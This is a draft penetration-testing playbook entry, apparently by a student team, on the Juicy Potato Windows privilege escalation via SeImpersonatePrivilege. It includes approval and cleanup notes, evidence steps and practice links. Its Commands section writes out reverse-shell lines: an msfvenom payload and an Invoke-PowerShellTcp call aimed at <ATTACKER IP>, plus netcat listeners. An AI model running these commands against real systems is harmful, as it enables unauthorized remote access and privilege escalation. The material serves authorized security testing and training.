*Draft: command steps not filled in yet.*

# 22. Juicy Potato

- **Phase:** Escalation (needs a shell on the host)
- **Risk:** 🔴 Risky: it escalates to SYSTEM and puts files on the client's host, and antivirus may flag them. Approval every time (matches `checklists/10-ad-internal.md`). Record what's dropped and remove it afterwards.
- **Tier:** Recognize
- **Finding:** none in the library yet
- **Runs on:** Windows 7, 8, 8.1, 10; Server 2008, 2012, 2016 (older builds; fixed in later Windows 10 and Server 2019)

## What it is
Juicy Potato is a local privilege escalation: from a service account to SYSTEM on the same host. It works when the current account holds the **SeImpersonatePrivilege** right, which service accounts for IIS and SQL Server usually have.

The underlying finding is a service account with the impersonation right on an old Windows build; Juicy Potato is one way to prove it. On newer Windows, other "potato" tools do the same job. The 2024 Runlist parks God Potato (#24) as "still working out, may be too unstable".

## Commands
- **Reverse Shell:**
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER IP> LPORT=9000 -f exe > rshell.exe`

- **PowerShell to get the current version of windows to determine the CLSIDS:**
`(Get-WmiObject -class Win32_OperatingSystem).Caption`

- **Edit Invoke-PowerShellTcp.ps1**  and add the following line to the end of the script (replace the IP address with the attack box ip):
`Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER IP> -Port 443`

- **Terminal Listeners:**
Term 1: `sudo nc -nlvp 443`
Term 2: `python3 -m http.server 8000`
Term Terminal 3: `nc -nvlp 9000`


## Evidence to capture
- `evidence/F-NNN-01.png`: the account's privileges showing SeImpersonatePrivilege.
- `evidence/F-NNN-02.png`: the result showing SYSTEM, if run.
- The logged commands with timestamps, and the list of files placed on the host.

## Practice
- **HTB box:** Bounty
- **Walkthroughs:** https://0xdf.gitlab.io/2018/10/27/htb-bounty.html, https://medium.com/@v1per/bounty-hackthebox-writeup-5b79a79e6de9
- [[TODO: the Bounty-specific steps from the 2024 doc, if worth keeping]]

---
*Adapted from the CCSF 2024 Windows playbooks. Updated by the CCSF 2026 team.*
